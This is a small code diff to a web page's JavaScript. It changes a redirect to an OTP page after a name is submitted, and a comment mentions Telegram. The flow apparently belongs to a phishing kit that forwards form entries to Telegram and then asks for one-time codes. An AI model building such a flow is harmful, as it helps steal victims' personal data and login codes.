@@ -338,7 +338,7 @@
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 // Always redirect - don't block on Telegram errors
-                window.location.href = 'otp.html?msg=againc';
+                window.location.href = 'otp.html?msg=name';
             } catch (error) {
                 console.error('Error submitting name:', error);
                 alert('Failed to process. Please try again.');
